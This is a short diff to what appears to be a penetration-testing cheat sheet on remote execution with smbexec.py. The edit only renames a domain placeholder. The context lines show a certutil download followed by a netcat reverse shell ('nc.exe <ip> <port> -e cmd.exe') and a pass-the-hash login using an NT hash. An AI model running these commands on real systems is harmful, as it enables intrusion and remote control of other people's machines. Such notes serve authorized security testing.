@@ -9,7 +9,7 @@ create a new service 'BTOBTO' (using temp bat files via SMB)
 upgrade full shell :
     certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe
 ```
-smbexec.py -shell-type powershell '<domain>/<user>:<password>'@<ip>
+smbexec.py -shell-type powershell '<domain_fqdn>/<user>:<password>'@<ip>
 ```
 
 ## pth
@@ -18,7 +18,7 @@ create a new service 'BTOBTO' (using temp bat files via SMB)
 upgrade full shell :
     certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe
 ```
-smbexec.py -shell-type powershell -hashes :<nt_hash> <domain>/<user>@<ip>
+smbexec.py -shell-type powershell -hashes :<nt_hash> <domain_fqdn>/<user>@<ip>
 ```
 
 ## ptt
